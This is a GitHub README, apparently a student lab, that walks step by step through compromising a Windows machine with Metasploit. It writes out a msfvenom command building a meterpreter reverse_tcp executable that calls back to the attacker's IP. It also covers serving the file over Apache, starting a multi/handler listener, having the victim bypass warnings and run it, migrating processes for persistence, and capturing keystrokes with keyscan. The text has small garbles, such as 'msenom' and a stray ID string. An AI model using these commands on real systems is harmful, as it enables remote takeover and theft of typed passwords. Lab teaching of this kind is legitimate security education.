# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

# PROGRAM:
Find the attackers ip address using ifconfig
# OUTPUT:
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/d140f4f1-4c63-4c12-8956-2b3f92c0d3c8)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
# OUTPUT:
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/7c0c977a-fba5-48a9-b928-8648df8b342e)

copy the fun.exe into the apache /var/www/html folder 240482762-37d7e507-5d47-4ddb-ba93-586f6d73a51b
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/29a73b1b-acdc-4ac2-a8f6-25b7a4815450)

Start apache server sudo systemctl apache2 start
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/a8ca0653-6288-4fc7-8d26-2a1dd8cd7935)

Check the status of apache2
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/09cd8714-ed79-455e-9159-f1b49fe25f3f)

Invoke msfconsole:
# OUTPUT:
  Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

  Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
  ![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/d8f49046-22e2-47e7-a729-6b35e0dddddb)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/44e6b0a1-7f27-4e8b-8809-b535e79f6a7a)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/aee4bee9-6e58-4125-a4e2-f4cac9416fdf)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/ad54d541-00b9-40e9-9497-e4861e2f04af)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/d6b0e0d4-ef5c-4568-aafe-02c478155626)
keyscan_dump Shows the keystrokes captured so far 
![image](https://github.com/MrSanthosh-dev/Compromising-windows-using-Metasploit/assets/117916573/e033cebf-151c-4bb3-bf86-437a08e37918)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
